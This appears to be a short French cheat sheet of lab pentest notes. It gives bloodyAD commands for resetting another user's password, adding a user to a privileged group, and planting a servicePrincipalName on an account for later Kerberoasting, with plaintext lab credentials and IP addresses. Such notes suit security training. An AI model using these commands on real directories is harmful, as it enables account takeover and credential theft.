

### Changement de mdp
```bash 
bloodyad -d administrator -u 'Olivia' -p 'ichliebedich' --host 10.129.41.212 set password Michael Password1234*
```

### Ajouter un user dans un groupe
```bash
bloodyad -u <USER> -p <PASS> -d <DOMAIN-NAME> --host <IP-DC> add groupMember 'service accounts' <USER_CIBLE>

[+] p.agila added to service accounts
```

### Ajouter un SPN au compte pour futur Keroasting
```bash
# Ajout d'un SPN pour le compte de N.Thompspn  
bloodyad -d delegate.vl  -u 'A.Briggs' -p 'P4ssw0rd1#123' --host 10.129.234.69 set object N.Thompson servicePrincipalName -v 'http:/anything'
```
